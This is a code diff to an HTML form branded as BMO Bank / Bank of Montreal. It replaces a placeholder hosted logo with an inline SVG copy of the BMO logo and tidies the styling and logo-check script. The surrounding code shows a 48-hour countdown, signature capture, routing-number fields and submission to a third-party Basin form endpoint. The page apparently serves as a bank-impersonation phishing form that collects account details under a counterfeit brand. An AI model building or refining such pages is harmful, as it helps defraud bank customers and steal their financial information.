@@ -11,10 +11,7 @@
     --orange:#f97316; --orange-light:#fff7ed; --orange-border:#fed7aa;
     --green-bg:#ecfdf5; --green-border:#16a34a; --text:#111827;
     --muted:#4b5563; --border:#e5e7eb;
-    /* BMO brand palette */
-    --bmo-blue:#0033A0;
-    --bmo-red:#E4002B;
-    --bmo-white:#FFFFFF;
+    --bmo-blue:#0033A0; --bmo-azure:#1585c5; --bmo-red:#E4002B; --bmo-white:#FFFFFF;
   }
   *{box-sizing:border-box}
   body{margin:0;font-family:Inter,system-ui,Arial,sans-serif;background:#f8fafc;color:var(--text)}
@@ -49,43 +46,14 @@
     border-radius:12px;
     padding:16px 14px 14px;
     margin-bottom:14px;
-    position:relative;
-    overflow:hidden;
+    position:relative;overflow:hidden;
   }
-  /* red accent bar at top */
-  .bmo-banner::before{
-    content:"";
-    position:absolute;
-    top:0;left:0;right:0;
-    height:5px;
-    background:var(--bmo-red);
-  }
-  .bmo-logo{
-    width:220px;max-width:100%;height:auto;
-    border-radius:6px;display:block;object-fit:contain;
-    background:var(--bmo-white);
-  }
-  .bmo-sub{
-    font-size:13px;
-    font-weight:800;
-    color:var(--bmo-blue);
-    letter-spacing:.3px;
-  }
-  /* logo status badge – on-brand blue */
-  .logo-status{
-    font-size:11px;font-weight:800;
-    padding:3px 10px;border-radius:999px;white-space:nowrap;
-  }
-  .logo-status.ok{
-    background:#e8edfb;
-    color:var(--bmo-blue);
-    border:1px solid var(--bmo-blue);
-  }
-  .logo-status.err{
-    background:#fde8ec;
-    color:var(--bmo-red);
-    border:1px solid var(--bmo-red);
-  }
+  .bmo-banner::before{content:"";position:absolute;top:0;left:0;right:0;height:5px;background:var(--bmo-red)}
+  .bmo-logo{width:240px;max-width:100%;height:auto;border-radius:6px;display:block}
+  .bmo-sub{font-size:13px;font-weight:800;color:var(--bmo-blue);letter-spacing:.3px}
+  .logo-status{font-size:11px;font-weight:800;padding:3px 10px;border-radius:999px;white-space:nowrap}
+  .logo-status.ok{background:#e8edfb;color:var(--bmo-blue);border:1px solid var(--bmo-blue)}
+  .logo-status.err{background:#fde8ec;color:var(--bmo-red);border:1px solid var(--bmo-red)}
 
   .checks{display:flex;gap:16px;flex-wrap:wrap;background:var(--orange-light);border:1px solid var(--orange-border);padding:12px;border-radius:10px}
   .check{display:flex;align-items:center;gap:8px;font-weight:700;font-size:14px}
@@ -159,9 +127,18 @@
     <!-- BASIN CONFIG -->
     <input type="hidden" name="_gotcha" style="display:none" tabindex="-1" autocomplete="off" />
 
-    <!-- BMO HEADER – HOSTED URL + BRAND COLORS -->
+    <!-- BMO HEADER – INLINE SVG LOGO (blue / white / red) -->
     <div class="bmo-banner">
-      <img id="bmoLogoImg" class="bmo-logo" src="https://YOUR-HOSTED-URL/bmo-logo.png" alt="BMO Bank N.A. logo" width="220" />
+      <svg id="bmoLogoSvg" class="bmo-logo" viewBox="0 0 340 120" role="img" aria-label="BMO Bank N.A. logo" xmlns="http://www.w3.org/2000/svg">
+        <rect width="340" height="120" rx="6" fill="#ffffff"/>
+        <text x="22" y="82" font-family="Georgia, 'Times New Roman', serif" font-size="64" font-weight="700" fill="#1585c5" letter-spacing="1">BMO</text>
+        <circle cx="282" cy="60" r="46" fill="#e4002b"/>
+        <g fill="#ffffff">
+          <rect x="254" y="68" width="56" height="12" rx="1"/>
+          <polygon points="256,68 270,42 284,68"/>
+          <polygon points="284,68 298,42 310,68"/>
+        </g>
+      </svg>
       <div style="display:flex;align-items:center;gap:8px;flex-wrap:wrap;justify-content:center">
         <div class="bmo-sub">Bank of Montreal – United States</div>
         <span id="logoStatus" class="logo-status" aria-live="polite"></span>
@@ -240,7 +217,6 @@
   // ====== CONFIG ======
   const BASIN_ENDPOINT = "https://usebasin.com/f/11fc628e04eb";
   const SIGNATURE_SRC  = "signature.png";
-  const BMO_LOGO_SRC   = "https://YOUR-HOSTED-URL/bmo-logo.png";
   const DEADLINE_KEY   = "bmoFormDeadline_v1";
   const TOTAL_MS       = 48 * 3600 * 1000;
   // ====================
@@ -262,7 +238,6 @@
   const tM = document.getElementById("tM");
   const tS = document.getElementById("tS");
 
-  const logoImg    = document.getElementById("bmoLogoImg");
   const logoStatus = document.getElementById("logoStatus");
 
   let drawing = false, hasSignature = false;
@@ -321,19 +296,12 @@
     syncSubmit();
   });
 
-  // ---- Logo live check ----
-  logoImg.src = BMO_LOGO_SRC;
+  // ---- Logo live check (inline SVG is always present) ----
   function reviewLogo(){
-    if (logoImg.complete && logoImg.naturalWidth > 0) {
-      logoStatus.textContent = "✓ Logo live";
-      logoStatus.className = "logo-status ok";
-    } else {
-      logoStatus.textContent = "⚠ " + BMO_LOGO_SRC + " not found";
-      logoStatus.className = "logo-status err";
-    }
+    const svg = document.getElementById("bmoLogoSvg");
+    if (svg) { logoStatus.textContent = "✓ Logo live"; logoStatus.className = "logo-status ok"; }
+    else { logoStatus.textContent = "⚠ logo missing"; logoStatus.className = "logo-status err"; }
   }
-  logoImg.addEventListener("load", reviewLogo);
-  logoImg.addEventListener("error", reviewLogo);
   window.addEventListener("load", reviewLogo);
 
   // ---- Routing number sync ----
